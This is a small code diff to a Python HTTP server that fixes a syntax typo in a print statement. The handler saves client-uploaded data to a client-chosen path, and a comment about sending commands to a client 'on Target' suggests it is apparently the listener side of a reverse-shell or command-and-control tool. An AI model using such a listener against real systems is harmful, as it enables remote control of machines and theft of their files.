@@ -20,7 +20,7 @@ class MyHandler(BaseHTTPRequestHandler):
         data = parse_qs(self.rfile.read(length).decode())
         with open("{}".format(data['path'][0]),'wb') as output_file:
             output_file.write(data["rfile"][0].encode())
-        print("File saved as {}".format(data['path'][0]))le")
+        print("File saved as {}".format(data['path'][0]))
 
     # Send command to client (on Target)
     def do_GET(self):
